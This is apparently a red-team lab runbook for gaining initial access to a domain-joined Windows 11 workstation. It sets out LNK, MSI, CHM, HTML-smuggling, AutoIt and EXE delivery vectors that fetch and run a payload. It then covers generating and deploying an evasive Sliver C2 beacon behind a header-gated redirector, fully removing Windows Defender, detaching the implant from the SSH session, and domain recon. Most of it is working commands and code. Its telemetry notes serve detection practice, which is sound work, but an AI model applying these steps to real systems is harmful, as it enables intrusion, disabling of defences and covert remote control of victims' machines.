# CAMPAIGNS v3 — H — Phase 0.5 — Initial Access on ws01

> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA-v2.md`](../CAMPAIGNS-METADATA-v2.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Attacker host:** provisioning (`192.168.77.60`) — HTTP delivery on `:8081`  
**Target host:** ws01 (`192.168.77.62`) — `child.cadre.local\analyst_t1`  
**This is the ONLY branch where provisioning is the attacker (Rule 4).**

---

## Phase 0.5 — Initial Access — File Delivery & Execution on ws01

The campaign v3 main spine begins on the domain-joined Windows 11 workstation `ws01` (`192.168.77.62`). The target user is `child.cadre.local\analyst_t1`, a Tier-1 analyst who browses the lab network and opens files delivered by email, Teams, or an internal share.

`ws01` runs **Windows Defender Antivirus** (local, not MDE P2) with Tamper Protection and Real-Time Protection. It also has an **Elastic Agent** enrolled in Fleet under the `CADRE-WS01` policy with System and Windows integrations. There is **no Elastic Defend** on `ws01`. For C2 implant testing, Defender was fully disabled using the `windows-defender-remover` script (see C2 section below).

**Scenario:** The attacker hosts weaponized files on provisioning (`192.168.77.60:8081`). The user on ws01 is tricked into opening a delivered file (LNK, MSI, CHM, HTML, AutoIt script, or EXE). The payload writes a marker file to `C:\Windows\Temp\H-PAYLOAD-MARKER.txt` as proof of execution.

**Outcome:** A low-privileged beachhead on `ws01` as `child.cadre.local\analyst_t1`. From this session the attacker can run Phase 0 reconnaissance from a domain-joined Windows host, discover `intern_blue` (DONT_REQUIRE_PREAUTH), and transition into Phase 1 (AS-REP roast).

**Success criterion:** `C:\Windows\Temp\H-PAYLOAD-MARKER.txt` exists and contains `H-PAYLOAD|executed as CHILD\analyst_t1|WS01`. This is a **marker EXE**, not a C2 implant. Future C2 integration (C2Stack) will swap `payload.exe` for a real beacon.

---

## Prerequisites

- `ws01` deployed and domain-joined (`17-ws01-deploy.yml` complete)
- MDE P2 onboarded and Healthy
- Elastic Agent Healthy under `CADRE-WS01` policy
- provisioning (`192.168.77.60`) reachable from ws01 on `vmnet2`
- H delivery stack staged: `ansible-playbook 19-initial-access.yml` complete
- HTTP `:8081` listening on provisioning (verify: `19-initial-access-verifyOnly.yml` or `tools/start-h-server.sh`)

**If `:8081` is not listening** (most common issue after VM restart):

```bash
# Option 1: re-run the full deploy playbook
ansible-playbook 19-initial-access.yml

# Option 2: restart just the HTTP server (from host via SSH)
ssh -i C:\Users\Ganro\.ssh\cadre-provisioning-key vagrant@192.168.77.60 \
  "bash -s" < tools/start-h-server.sh

# Option 3: on provisioning directly
bash ~/start-h-server.sh
# or manually:
cd ~/www && nohup python3 -m http.server 8081 --bind 0.0.0.0 > ~/www-server.log 2>&1 &
```

---

## What Was Actually Built (2026-08-03)

One tiny **marker EXE** (`payload.exe`, 4096 bytes), then six wrappers around it. The marker writes `C:\Windows\Temp\H-PAYLOAD-MARKER.txt` as `CHILD\analyst_t1` on `WS01`.

`payload.cs` on ws01:
```csharp
string line = "H-PAYLOAD|executed as " + who + " at " + ... + "|" + Environment.MachineName;
File.WriteAllText(@"C:\Windows\Temp\H-PAYLOAD-MARKER.txt", line + ...);
```

| Vector | File | Size | Build Host | What it does | Verified |
|--------|------|------|------------|--------------|----------|
| **H-01 LNK** | `Invoice.lnk` | 1793B | ws01 | Shortcut → cmd → fetch `payload.exe` from `:8081` and run | ✅ |
| **H-02 MSI** | `H-02-evil.msi` | 32768B | ws01 (WiX) | `msiexec /i /qn` deferred CA runs payload | ✅ |
| **H-03 CHM** | `H-03-evil.chm` | 9306B | ws01 (hhc) | Shortcut object → `cmd /c payload.exe` | ⚠️ compiled; `hh.exe` sandbox blocks exec |
| **H-04 HTML** | `H-04-smuggle.html` | 5883B | ws01 | Blob download of payload in browser | ✅ builder only (click = user practice) |
| **H-05 AutoIt** | `AutoIt3.exe` + `.au3` | 980064B | ws01 | InetGet `payload.exe` from `:8081` then Run | ✅ |
| **H-06 EXE** | `payload.exe` | 4096B | ws01 | Download + run | ✅ |

**Build host = ws01** (`C:\Tools\campaign-h\www\`): WiX (`candle`/`light`), HTML Help Workshop (`hhc`), AutoIt portable, `payload.cs` compile, LNK via `WScript.Shell`.

**Attacker host = provisioning** (`~/www` + `python3 -m http.server 8081`): copies of the six artifacts for ws01 to download.

**Delivery URL:** `http://192.168.77.60:8081/<file>`

---

## H-01 — Malicious LNK

**Target:** `ws01` (`192.168.77.62`) — `analyst_t1` desktop / Downloads  
**Vector:** `.lnk` shortcut with a crafted `Target` field that launches `cmd.exe /c` to download and run `payload.exe` from provisioning `:8081`  
**MITRE:** T1204.002 (User Execution: Malicious Link) / T1566.001 (Spearphishing Attachment)

**Artifact:** `Invoice.lnk` (1793B) — pre-built on ws01, hosted on provisioning `:8081`.

**Deliver to ws01 Downloads:**

```powershell
# From ws01 as analyst_t1 — download from provisioning
curl -o C:\Users\analyst_t1\Downloads\Invoice-H01.lnk http://192.168.77.60:8081/Invoice.lnk
```

**Simulate user double-click:**

```powershell
# From ws01 as analyst_t1
Start-Process C:\Users\analyst_t1\Downloads\Invoice-H01.lnk
```

**Verify marker:**

```powershell
# Check marker file
type C:\Windows\Temp\H-PAYLOAD-MARKER.txt
# Expected: H-PAYLOAD|executed as CHILD\analyst_t1|WS01|...

# Clean up after verification
Remove-Item C:\Windows\Temp\H-PAYLOAD-MARKER.txt -Force -ErrorAction SilentlyContinue
```

**Expected telemetry:**
- Sysmon EID 1: `cmd.exe` child of `explorer.exe`
- Sysmon EID 3: HTTP egress to `192.168.77.60:8081`
- Sysmon EID 11: `payload.exe` written to `%TEMP%` or Downloads
- WinSec 4688: `cmd.exe` / `payload.exe` process creation
- MDE alert: `Suspicious LNK file` or `A malicious file was observed`
- MOTW: `zone.identifier` ADS on the LNK (if downloaded via browser)

---

## H-02 — MSI Installer

**Target:** `ws01` — `analyst_t1`  
**Vector:** Weaponized `.msi` installer built with WiX; deferred custom action runs `payload.exe` after `InstallFiles`  
**MITRE:** T1218.007 (Signed Binary Proxy Execution: Msiexec) / T1566.001

**Artifact:** `H-02-evil.msi` (32768B) — pre-built on ws01 with WiX (`candle` + `light`), hosted on provisioning `:8081`.

**Deliver and execute on ws01 as analyst_t1:**

```powershell
# Download from provisioning
curl -o C:\Users\analyst_t1\Downloads\H-02-evil.msi http://192.168.77.60:8081/H-02-evil.msi

# Execute (quiet, no UI)
msiexec /i C:\Users\analyst_t1\Downloads\H-02-evil.msi /quiet /qn
```

**Verify marker:**

```powershell
type C:\Windows\Temp\H-PAYLOAD-MARKER.txt
Remove-Item C:\Windows\Temp\H-PAYLOAD-MARKER.txt -Force -ErrorAction SilentlyContinue
```

**Expected telemetry:**
- Sysmon EID 1: `msiexec.exe` with `/i`, child process from deferred CA
- Sysmon EID 11: `payload.exe` write
- Sysmon EID 3: HTTP egress to `:8081` (if payload downloads)
- WinSec 4688: `msiexec.exe` launching child process
- MDE alert: `msiexec` network activity or `Suspicious MSI execution`
- MOTW: `zone.identifier` on the downloaded `.msi`

**Build note:** The MSI was built on ws01 using WiX `candle.exe` + `light.exe` from `C:\Tools\campaign-h\www\wix\`. The deferred CA runs `After=InstallFiles` (ICE77 sequencing fix). Builder script: `attack-matrix/04-automation/campaign-h/wt064-msi-builder.ps1`.

---

## H-03 — Compiled HTML Help (.chm)

**Target:** `ws01` — `analyst_t1`  
**Vector:** `.chm` file using `Shortcut` object to invoke `cmd.exe /c payload.exe` from the HTML Help viewer (`hh.exe`)  
**MITRE:** T1218.001 (Compiled HTML File) / T1566.001

**Artifact:** `H-03-evil.chm` (9306B) — pre-built on ws01 with HTML Help Workshop (`hhc.exe`), hosted on provisioning `:8081`.

**Known platform limitation:** **Execution is blocked on modern `hh.exe`.** The CHM compiles correctly and decompilation confirms the Shortcut object + `cmd.exe /c payload.exe` is present, but modern Windows 11 `hh.exe` ActiveX sandbox prevents the command from executing. This is a **platform limit**, same class as WT012 Rubeus PAC on Server 2025.

**Deliver and attempt execution on ws01 as analyst_t1:**

```powershell
# Download from provisioning
curl -o C:\Users\analyst_t1\Downloads\H-03-evil.chm http://192.168.77.60:8081/H-03-evil.chm

# Attempt execution (will likely fail on modern hh.exe)
Start-Process C:\Users\analyst_t1\Downloads\H-03-evil.chm

# Check marker (likely absent due to sandbox)
type C:\Windows\Temp\H-PAYLOAD-MARKER.txt 2>$null
```

**Build note:** Built on ws01 using `hhc.exe` from `C:\Tools\campaign-h\www\hhw\`. Builder script: `attack-matrix/04-automation/campaign-h/wt065-chm-builder.ps1`. Decompile with `7za x H-03-evil.chm` to verify Shortcut object content.

**Expected telemetry (if execution succeeds):**
- Sysmon EID 1: `hh.exe` spawning `cmd.exe`
- WinSec 4688: `hh.exe` child process
- MDE alert: `Suspicious HTML Help Execution`

**Status:** ⚠️ Build + content verified; execution platform-blocked by modern `hh.exe` ActiveX sandbox.

---

## H-04 — HTML Smuggling

**Target:** `ws01` — `analyst_t1` browser (Edge/Chrome)  
**Vector:** Malicious HTML page that uses JavaScript to assemble a blob payload client-side and trigger a download, bypassing simple attachment filters  
**MITRE:** T1027.006 (Obfuscated Files or Information: HTML Smuggling) / T1566.001

**Artifact:** `H-04-smuggle.html` (5883B) — pre-built on ws01, hosted on provisioning `:8081`.

**Deliver to ws01:** Open `http://192.168.77.60:8081/H-04-smuggle.html` in Edge/Chrome as `analyst_t1`.

**Builder note:** Built with `attack-matrix/04-automation/campaign-h/wt066-html-smuggling.py` — embeds `payload.exe` as base64 in the HTML. Browser detonation (user clicks download + runs) = user practice per Rule 3.

**Expected telemetry:**
- Browser download history (Edge/Chrome `History` SQLite)
- Sysmon EID 11: `payload.exe` written to Downloads
- Sysmon EID 1: payload execution child of `explorer.exe` (if user runs it)
- MDE alert: `HTML smuggling` or `Suspicious download`
- MOTW: `zone.identifier` on downloaded file

**Status:** ✅ Builder verified (HTML size 5883B, payload embedded). Browser detonation = user practice.

---

## H-05 — AutoIt3

**Target:** `ws01` — `analyst_t1`  
**Vector:** Portable `AutoIt3.exe` + `.au3` script that uses `InetGet` to fetch `payload.exe` from `:8081` then `Run`  
**MITRE:** T1059.005 (Visual Basic / AutoIt) / T1566.001

**Artifacts:** `AutoIt3.exe` (980064B, portable) + `.au3` script — hosted on provisioning `:8081`.

**Deliver and execute on ws01 as analyst_t1:**

```powershell
# Download AutoIt3.exe and the .au3 script from provisioning
curl -o C:\Users\analyst_t1\Downloads\AutoIt3.exe http://192.168.77.60:8081/AutoIt3.exe

# Create the .au3 script (or download it if hosted)
# The .au3 does: InetGet("http://192.168.77.60:8081/payload.exe", @TempDir & "\payload.exe", 1, 1)
#                Run(@TempDir & "\payload.exe")

# Run the AutoIt script
C:\Users\analyst_t1\Downloads\AutoIt3.exe C:\Users\analyst_t1\Downloads\stager.au3
```

**Verify marker:**

```powershell
type C:\Windows\Temp\H-PAYLOAD-MARKER.txt
Remove-Item C:\Windows\Temp\H-PAYLOAD-MARKER.txt -Force -ErrorAction SilentlyContinue
```

**Expected telemetry:**
- Sysmon EID 1: `AutoIt3.exe` process creation
- Sysmon EID 3: HTTP egress to `:8081` (InetGet)
- Sysmon EID 11: `payload.exe` in `%TEMP%`
- WinSec 4688: `AutoIt3.exe` process creation
- MDE alert: `Suspicious AutoIt execution`
- MOTW: `zone.identifier` on dropped file

---

## H-06 — Malicious EXE

**Target:** `ws01` — `analyst_t1`  
**Vector:** Direct executable delivery — user downloads and runs `payload.exe`  
**MITRE:** T1204.002 (User Execution: Malicious File) / T1566.001

**Artifact:** `payload.exe` (4096B) — .NET console assembly that writes the marker file. Hosted on provisioning `:8081`.

**Deliver and execute on ws01 as analyst_t1:**

```powershell
# Download from provisioning
curl -o C:\Users\analyst_t1\Downloads\payload-h06.exe http://192.168.77.60:8081/payload.exe

# Execute
C:\Users\analyst_t1\Downloads\payload-h06.exe
```

**Verify marker:**

```powershell
type C:\Windows\Temp\H-PAYLOAD-MARKER.txt
# Expected: H-PAYLOAD|executed as CHILD\analyst_t1|WS01|...

Remove-Item C:\Windows\Temp\H-PAYLOAD-MARKER.txt -Force -ErrorAction SilentlyContinue
```

**Expected telemetry:**
- Sysmon EID 1: `payload.exe` (unknown exe) child of `explorer.exe` or `cmd.exe`
- Sysmon EID 11: marker file write to `C:\Windows\Temp\`
- WinSec 4688: `payload.exe` process creation
- MDE alert: `Suspicious process` / `Malware detected`
- MOTW: `zone.identifier` on downloaded file

**Future C2 integration:** This is the simplest vector to swap for a real C2 beacon. Replace `payload.exe` on provisioning `~/www/` with a Sliver/Mythic/Havoc implant binary, then re-run H-06 (or H-01, which fetches `payload.exe` from `:8081`).

---

## Validation Method

Validation is **not** a real phishing click in Outlook. The method is:

1. Stage/build on `C:\Tools\campaign-h\www` on ws01
2. Host on provisioning `:8081`
3. **SSH as `analyst_t1`** to ws01 and **simulate** the vector (`Start-Process` on the LNK, `msiexec /qn`, AutoIt, download EXE)
4. Assert the marker file `C:\Windows\Temp\H-PAYLOAD-MARKER.txt`
5. Clean Temp copies; keep Downloads copies and the tool tree

H-04 was **not** fully detonated in a browser (builder verified only). H-03 does not execute on modern `hh.exe`.

---

## Playbook & Tooling Reference

| Component | Path |
|---|---|
| Deploy playbook | `ansible/playbooks/19-initial-access.yml` |
| Verify playbook | `ansible/playbooks/19-initial-access-verifyOnly.yml` |
| HTTP restart script | `tools/start-h-server.sh` |
| Builder scripts | `attack-matrix/04-automation/campaign-h/wt063-068*` |
| Orchestrator scripts | `attack-matrix/04-automation/linux/windows/wt-h-*` |
| Artifact storage (git) | `ansible/files/campaign-h/` (5 files; AutoIt3.exe manually staged) |
| ws01 staging root | `C:\Tools\campaign-h\www\` |
| provisioning webroot | `~/www/` (served on `:8081`) |

**Manually-staged binaries** (not in git, obtained per session):
- WiX (`wix314-binaries.zip` → `candle.exe` + `light.exe`) → ws01 `C:\Tools\campaign-h\www\wix\`
- HTML Help Workshop (`hhc.exe` via `htmlhelp.exe` + 7-Zip) → ws01 `...\hhw\`
- AutoIt3.exe (portable, 980064B) → ws01 `...\www\` + provisioning `~/www/`

---

## C2 Implant Delivery (Sliver via C2Stack) — Smoke Test Verified 2026-09-04

The marker EXE proves delivery + execution. The next step is a **real C2 implant** (Sliver beacon) delivered through the same H-06 path, giving the operator interactive control of ws01.

### Architecture

```
ws01 (192.168.77.62)          Host (192.168.77.1)              provisioning (192.168.77.60)
  analyst_t1                     Docker Desktop                   ~/www/ :8081
    |                              c2stack-sliver-1                   |
    |  1. Download implant <----- :8082 (direct, smoke test) <------- implant hosted here
    |     from provisioning :8081  :80 (redirector, needs header)     |
    |                              :31337 (gRPC control)              |
    |  2. Implant beacons back --> :8082 --> Sliver teamserver        |
    |                                                              operator:
    |  3. Operator tasks beacon --- :31337 --> sliver-client <------ on provisioning
```

### C2Stack Setup (host)

```powershell
# Start Sliver + redirector containers
cd C:\STUDY\Github\CADRE-Platform\C2Stack\Docker
docker compose --env-file .env up -d sliver redirector

# Smoke-test override: expose Sliver HTTP :80 directly on host :8082
# (bypasses redirector header check — see docker-compose.override.yml)
# Production path: use redirector with custom-header implant profile

# Verify
docker ps --format "table {{.Names}}\t{{.Ports}}" | findstr sliver
# Expected: 0.0.0.0:31337->31337/tcp, 0.0.0.0:8082->80/tcp
```

### Generate + Host Implant

```bash
# Inside the sliver container — create operator config (one-time)
docker exec c2stack-sliver-1 sh -c '
  export PATH=/root/.sliver/go/bin:$PATH
  sliver-server operator new --name cadre-operator \
    --lhost 192.168.77.1 --lport 31337 \
    --save /tmp/cadre-operator.cfg --permissions all
'

# Copy operator config to provisioning
docker cp c2stack-sliver-1:/tmp/cadre-operator.cfg /tmp/cadre-operator.cfg
scp -i ~/.ssh/cadre-provisioning-key /tmp/cadre-operator.cfg \
  vagrant@192.168.77.60:/tmp/cadre-operator.cfg
ssh -i ~/.ssh/cadre-provisioning-key vagrant@192.168.77.60 \
  "sliver-client import /tmp/cadre-operator.cfg"

# Create HTTP listener + generate Windows beacon (inside container)
docker exec c2stack-sliver-1 sh -c '
  export PATH=/root/.sliver/go/bin:$PATH
  cat > /tmp/setup.rc << "RC"
http --lhost 0.0.0.0 --lport 80 --website cadre-http
generate beacon --http 192.168.77.1:8082 --os windows --arch amd64 \
  --save /tmp/cadre-implant.exe --skip-symbols
exit
RC
  sliver-client console --rc /tmp/setup.rc
'

# Copy implant to provisioning ~/www
docker cp c2stack-sliver-1:/tmp/cadre-implant.exe /tmp/cadre-implant.exe
scp -i ~/.ssh/cadre-provisioning-key /tmp/cadre-implant.exe \
  vagrant@192.168.77.60:~/www/cadre-implant.exe
```

### Deliver + Execute on ws01

```powershell
# On ws01 as analyst_t1 — download from provisioning :8081
Invoke-WebRequest -Uri http://192.168.77.60:8081/cadre-implant.exe `
  -OutFile C:\Users\analyst_t1\Downloads\cadre-implant.exe -UseBasicParsing

# Execute (background, hidden)
Start-Process -FilePath C:\Users\analyst_t1\Downloads\cadre-implant.exe `
  -WindowStyle Hidden
```

### Verify Beacon Callback

```bash
# On the sliver container — check for beacons
docker exec c2stack-sliver-1 sh -c '
  export PATH=/root/.sliver/go/bin:$PATH
  cat > /tmp/check.rc << "RC"
beacons
exit
RC
  sliver-client console --rc /tmp/check.rc
'
# Expected: beacon with Hostname=ws01, Username=CHILD\analyst_t1, Transport=http(s)
```

### Smoke Test Result (2026-09-04)

#### Phase 1 — Direct Sliver HTTP (smoke test, bypass redirector)

| Step | Status | Detail |
|------|--------|--------|
| C2Stack Sliver container up | ✅ | `c2stack-sliver-1` on host `192.168.77.1:31337` + `:8082` |
| HTTP listener created | ✅ | Sliver HTTP :80 inside container, exposed as `:8082` on host |
| Operator config generated | ✅ | `cadre-operator.cfg` generated via `sliver-server operator` |
| Implant generated | ✅ | `cadre-implant-direct.exe` (23.7MB, Windows amd64, `--skip-symbols`) |
| Implant hosted on provisioning | ✅ | `~/www/cadre-implant-direct.exe` served via `:8081` |
| Implant downloaded on ws01 | ✅ | `C:\Users\analyst_t1\Downloads\cadre-implant-direct.exe` |
| Implant executed on ws01 | ✅ | PID 1192, process started as `CHILD\analyst_t1` |
| **Beacon callback received** | ✅ | Beacon `961b4851` (STRONG_PEAR) checked in from ws01 |
| **Defender killed implant** | ⚠️ | Windows Defender real-time monitoring terminated process after first check-in |
| Task execution (`whoami`) | ❌ | Beacon killed before second check-in to retrieve task result |

**Correction:** The original report attributed the kill to "MDE P2." MDE P2 is **not installed** on ws01. The local Windows Defender Antivirus with Tamper Protection enabled was responsible. No formal detection event (EID 1116/1117) was observed — the kill was behavior-based.

#### Phase 2 — Redirector path with custom C2 profile (verified)

| Step | Status | Detail |
|------|--------|--------|
| Custom Sliver C2 profile created | ✅ | Profile `cadre-redirector` with `X-Request-ID: cadre-c2` header |
| Obfuscated implant generated | ✅ | `cadre-implant-v2.exe` (47MB, `--evasion`, symbol obfuscation, custom C2 profile) |
| Implant downloads from provisioning | ✅ | Hosted on `:8081`, downloaded to ws01 Downloads |
| **Redirector routes traffic** | ✅ | Apache access log: `POST /cloud/storage/objects/...` → HTTP 200 (header matched) |
| **Beacon callback through redirector** | ✅ | Beacon `4cabf88a` (AWAKE_RICE) — remote addr shows `tcp(redirector)->sliver` |
| Beacon survives (Defender active) | ❌ | Defender real-time monitoring killed process after ~60s despite path exclusions |

**Key discovery:** The original implant was generated as a **session** (`IsBeacon=False`), not a beacon. Session implants connect once over HTTP and never poll again. This was the root cause of the "only one check-in" behavior, not Defender.

#### Phase 3 — Defender disabled + proper beacon (full C2 chain verified)

**Defender removal on ws01 (as `vagrant`):**

```powershell
# 1. Download windows-defender-remover (on host, ws01 has no internet)
git clone --depth 1 https://github.com/ionuttbara/windows-defender-remover.git
# SCP to ws01 C:\Temp\defender-remover\

# 2. Run full removal (as vagrant admin)
cd C:\Temp\defender-remover
cmd /c Script_Run.cmd Y    # Full removal: Defender + Security App + SmartScreen

# 3. After reboot, set DisableAntiSpyware=1 via SYSTEM scheduled task
#    (tamper protection blocks admin-level changes, but SYSTEM + GPO registry works)
#    Script: Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1

# 4. Reboot. After reboot:
#    - MsMpEng.exe: GONE
#    - WinDefend service: Stopped (StartType=Manual)
#    - Get-MpPreference: "Provider load failure" (engine removed)
#    - DisableAntiSpyware=1 confirmed in Policies registry
```

**Proper beacon generation (via sliver-py gRPC API on provisioning):**

```python
# Install sliver-py on provisioning
pip3 install sliver-py --break-system-packages

# Generate beacon with 5s interval (key fix: IsBeacon=True)
from sliver import SliverClientConfig, SliverClient
config = builds["AWAKE_RICE"]  # existing redirector-profile build
config.IsBeacon = True
config.BeaconInterval = 5_000_000_000  # 5 seconds (nanoseconds)
config.Format = 2  # EXECUTABLE
resp = await client.generate_implant(config, timeout=600)
# → cadre-implant-fast.exe (47MB)
```

**Deploy on ws01 (detached from SSH — critical):**

```powershell
# Copy to C:\Temp (Defender-excluded path)
Copy-Item C:\Users\analyst_t1\Downloads\cadre-implant-fast.exe C:\Temp\

# Start DETACHED from SSH (start /b prevents SSH session kill from taking the implant)
cmd /c "start /b C:\Temp\cadre-implant-fast.exe"
```

**⚠️ Critical: SSH session detachment.** Processes started via `Start-Process` over SSH are killed when the SSH session ends (Windows job object cleanup). Use `cmd /c "start /b ..."` or a scheduled task to detach the implant from the SSH session.

#### Final C2 Chain Verification (2026-09-04)

| Step | Status | Detail |
|------|--------|--------|
| Defender fully disabled | ✅ | MsMpEng gone, WinDefend stopped, DisableAntiSpyware=1 |
| Beacon implant generated | ✅ | `cadre-implant-fast.exe` (47MB, IsBeacon=True, 5s interval, redirector profile) |
| Implant deployed detached | ✅ | `cmd /c "start /b"` from `C:\Temp\` (PID 3136) |
| Process survives 2+ minutes | ✅ | Confirmed alive at 120s, 180s |
| **Recurring beacon check-ins** | ✅ | Beacon `26a09054` (MAGENTA_SOURWOOD) checking in every ~60s through redirector |
| **Redirector access logs** | ✅ | `POST /cloud/storage/objects/...` → HTTP 200/202 at recurring intervals |
| **Task queued + sent** | ✅ | `execute cmd.exe /c whoami` → task `47d6b67f` state=sent then completed |
| **Task completed** | ✅ | Task state=completed at next check-in |

**Full C2 chain confirmed:**
```
ws01 → :80 (redirector, X-Request-ID: cadre-c2 header) → Sliver :80 → operator tasks → beacon executes → result returned
```

**Lessons learned:**
1. **Sliver session vs beacon:** Session implants (`IsBeacon=False`) connect once over HTTP and never poll. For HTTP C2, always use `IsBeacon=True` with a short `BeaconInterval`.
2. **SSH detachment:** Windows kills child processes when SSH sessions end. Use `cmd /c "start /b"` or scheduled tasks to keep implants alive after SSH disconnects.
3. **Defender tamper protection:** Win11 tamper protection blocks ALL programmatic attempts to disable Defender (even as SYSTEM). The `windows-defender-remover` script + `DisableAntiSpyware=1` GPO registry key is the only reliable lab method.
4. **Path exclusions insufficient:** Even with `C:\Temp` excluded, Defender's behavior monitoring killed the implant. Full Defender removal was required for persistent C2.
5. **Redirector header contract:** The custom Sliver C2 profile (`cadre-redirector`) successfully embeds `X-Request-ID: cadre-c2` in all HTTP requests. Apache routes these to Sliver; requests without the header get 404.

**Remaining next steps:**
1. **Delivery via H-01 LNK:** Wrap the beacon in the existing LNK delivery vector for a realistic phishing-to-C2 chain
2. **Snapshot/restore:** Document the ws01 VM snapshot for restoring Defender after C2 testing

**C2Stack permanent support:** The redirector is the **production path** in C2Stack, not a local hack. The `.env` file in `C2Stack/Docker/` defines:
- `C2_HEADER_NAME=X-Request-ID`
- `C2_HEADER_VALUE=cadre-c2`
- `SLIVER_URI_PREFIX=/cloud/storage/objects`
- `SLIVER_BACKEND_HOST=sliver` / `SLIVER_BACKEND_PORT=80`
- `REDIRECTOR_HTTP_PORT=80`

The `docker-compose.override.yml` (exposing Sliver HTTP on host `:8082`) was only needed for the Phase 1 smoke test that bypassed the redirector. The Phase 3 verification used the permanent redirector path on `:80`.

### RedStrike C2 Integration

RedStrike's `SliverClient` (`redstrike/c2/sliver.py`) can drive the beacon once it's alive:

```python
from redstrike.c2 import get_c2_client, C2Backend

client = get_c2_client(C2Backend.SLIVER, endpoint="192.168.77.1:31337")
sessions = client.list_sessions()  # or beacons
result = client.shell(session_id, "whoami")
```

Or via CLI:
```bash
# On provisioning
python -m redstrike.cli campaign --c2 --c2-backend sliver \
  --c2-session 961b4851 --c2-endpoint 192.168.77.1:31337
```

---

## Phase 0.5 → Phase 1 Transition

From the ws01 beachhead as `analyst_t1`, the attacker performs lightweight domain reconnaissance. This reveals the `intern_blue` account in `child.cadre.local` with `DONT_REQUIRE_PREAUTH`. The attacker then pivots to Phase 1 — AS-REP roasting `intern_blue` from the ws01 beachhead.

**Recon commands from the ws01 beachhead:**

```powershell
# List domain users from the workstation
net user /domain

# PowerShell AD module alternative
Get-ADUser -Filter * -Properties userAccountControl | Select-Object Name,@{N='UAC';E={$_.userAccountControl}} | Where-Object { $_.UAC -band 0x400000 }

# Kerberos user enum from ws01 using kerbrute (if dropped on ws01)
# C:\Tools\kerbrute.exe userenum -d child.cadre.local --dc 192.168.77.11 C:\Tools\names.txt
```

**Key finding:** `intern_blue` has `DONT_REQUIRE_PREAUTH` set. The campaign transitions to Phase 1 — AS-REP roast — from the ws01 beachhead.

**See next:** [`CAMPAIGNS-RUNBOOK-1.md`](CAMPAIGNS-RUNBOOK-1.md)

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-0.md`](CAMPAIGNS-RUNBOOK-0.md) · Next: [`CAMPAIGNS-RUNBOOK-1.md`](CAMPAIGNS-RUNBOOK-1.md) →
